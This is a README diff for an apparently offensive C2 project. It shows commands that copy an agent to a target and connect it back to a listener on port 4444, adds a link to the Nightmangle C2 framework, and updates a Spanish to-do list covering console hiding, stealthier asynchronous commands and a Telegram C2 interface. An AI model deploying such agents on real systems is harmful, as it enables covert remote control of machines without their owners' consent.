@@ -42,7 +42,10 @@ scp target/release/agent user@target:/tmp/
 ./agent --server <listener-ip>:4444
 ```
 
+https://github.com/1N73LL1G3NC3x/Nightmangle/tree/master?tab=readme-ov-file
+
 ## ToDo
+
 
 - [x] Que no aparezca la consola del agente
 - [x] Crear un listener para tener multiples conexiones simultaneas con diferentes agentes
@@ -55,8 +58,8 @@ scp target/release/agent user@target:/tmp/
 
 ### Listener
 - [ ] Crear un listener con sockets para tener multiples conexiones simultaneas con diferentes agentes
-- [ ] Cuando se manda un comando que se haga de manera asíncrona para no bloquear la comunicación con el agente y además de una manera más sigilosa (threads, async/await, sleep, etc)
-- Crear un servidor que se encargue de recibir las conexiones de los agentes y enviarles comandos y que este servidor se comunique con la interfaz C2 (Telegram bot, web, etc)
+- [x] Cuando se manda un comando que se haga de manera asíncrona para no bloquear la comunicación con el agente y además de una manera más sigilosa (threads, async/await, sleep, etc)
+- [ ] Crear un servidor que se encargue de recibir las conexiones de los agentes y enviarles comandos y que este servidor se comunique con la interfaz C2 (Telegram bot, web, etc)
 
 ### Interfaz C2
 - [ ] Crear una interfaz mediante Telegram bot que permita enviar comandos y recibir respuestas de los agentes
